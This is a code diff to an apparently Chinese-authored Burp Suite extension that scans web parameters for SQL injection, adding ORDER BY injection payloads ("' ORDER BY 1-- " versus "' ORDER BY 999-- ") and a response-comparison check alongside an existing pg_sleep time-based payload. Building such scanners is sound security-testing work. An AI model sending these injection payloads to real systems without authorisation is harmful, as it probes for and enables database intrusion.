@@ -70,6 +70,16 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             "';SELECT pg_sleep(2.5)--"
     };
 
+    private static final String[] ORDER_BY_VALID_SUFFIXES = new String[]{
+            "' ORDER BY 1-- ",
+            "') ORDER BY 1-- "
+    };
+
+    private static final String[] ORDER_BY_INVALID_SUFFIXES = new String[]{
+            "' ORDER BY 999-- ",
+            "') ORDER BY 999-- "
+    };
+
     @Override
     public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
         this.callbacks = callbacks;
@@ -135,6 +145,9 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                             c.setForeground(Color.BLACK);
                         } else if ("报错注入".equals(type)) {
                             c.setBackground(new Color(128, 84, 192)); // 紫
+                            c.setForeground(Color.WHITE);
+                        } else if ("排序注入".equals(type)) {
+                            c.setBackground(new Color(66, 133, 244)); // 蓝
                             c.setForeground(Color.WHITE);
                         } else {
                             c.setBackground(new Color(245, 174, 66));
@@ -378,6 +391,25 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                 reportIssue(resp, "Time-based Blind SQL Injection", name, "High", payload);
             }
         }
+
+        for (int i = 0; i < ORDER_BY_VALID_SUFFIXES.length; i++) {
+            String validPayload = value + ORDER_BY_VALID_SUFFIXES[i];
+            String invalidPayload = value + ORDER_BY_INVALID_SUFFIXES[i];
+
+            IHttpRequestResponse validResp = sendPayloadAndLog(baseMessage, parameter, validPayload, host, path, name,
+                    "排序注入-测试", "发送合法 ORDER BY payload", requestMethod);
+            IHttpRequestResponse invalidResp = sendPayloadAndLog(baseMessage, parameter, invalidPayload, host, path, name,
+                    "排序注入-测试", "发送越界 ORDER BY payload", requestMethod);
+
+            if (validResp != null && invalidResp != null
+                    && isOrderByInjectable(baseStatus, baseBody, validResp.getResponse(), invalidResp.getResponse())) {
+                found.set(true);
+                markVuln(invalidResp, "blue", "Order-by SQLi confirmed");
+                appendLog(now(), host, path, name, "排序注入", validPayload + " || " + invalidPayload,
+                        "ORDER BY 合法/越界响应差异显著", "VULN", invalidResp);
+                reportIssue(invalidResp, "Order-by SQL Injection", name, "High", validPayload + " || " + invalidPayload);
+            }
+        }
     }
 
     private IHttpRequestResponse sendPayloadAndLog(IHttpRequestResponse base,
@@ -465,6 +497,27 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         }
 
         return status >= 500 && baseStatus < 500 && Math.abs(body.length() - baseBody.length()) > 50;
+    }
+
+    private boolean isOrderByInjectable(short baseStatus, String baseBody, byte[] validResp, byte[] invalidResp) {
+        if (validResp == null || invalidResp == null) {
+            return false;
+        }
+
+        boolean invalidHasError = isErrorBased(baseStatus, baseBody, invalidResp);
+        boolean validHasError = isErrorBased(baseStatus, baseBody, validResp);
+        if (invalidHasError && !validHasError) {
+            return true;
+        }
+
+        IResponseInfo validInfo = helpers.analyzeResponse(validResp);
+        IResponseInfo invalidInfo = helpers.analyzeResponse(invalidResp);
+        String validBody = helpers.bytesToString(slice(validResp, validInfo.getBodyOffset()));
+        String invalidBody = helpers.bytesToString(slice(invalidResp, invalidInfo.getBodyOffset()));
+
+        boolean statusDiff = validInfo.getStatusCode() < 500 && invalidInfo.getStatusCode() >= 500;
+        boolean lenDiff = Math.abs(validBody.length() - invalidBody.length()) > Math.max(40, (int) (validBody.length() * 0.08));
+        return statusDiff || lenDiff;
     }
 
     private boolean isBooleanBlind(byte[] baseResp, byte[] trueResp, byte[] falseResp) {
